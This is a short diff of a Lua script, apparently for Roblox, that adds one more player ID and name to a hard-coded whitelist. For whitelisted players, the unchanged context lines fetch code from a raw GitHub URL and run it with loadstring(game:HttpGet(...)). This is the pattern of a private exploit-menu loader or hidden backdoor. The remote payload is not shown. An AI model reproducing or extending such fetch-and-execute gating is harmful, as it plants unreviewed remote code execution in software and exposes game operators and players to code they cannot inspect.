@@ -81,6 +81,7 @@ local function OKHS_fake_script() -- Frame.Script
 		or player.UserId == 419371695 and player.Name == "Youngboy_Wisdom2" -- serpie
                 or player.UserId == 1710102313 and player.Name == "YounUchiha2x" -- serpie
 		or player.UserId == 468082196 and player.Name == "AdminPeaceKeeper" -- Daniel 
+		or player.UserId == 277433077 and player.Name == "Brxvsnn" -- Txzy
 		or player.UserId == 2065386487 and player.Name == "jeries1234nijem" then -- johnboy
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/imiranian/menu/main/asli", true))()
 		wait(2)
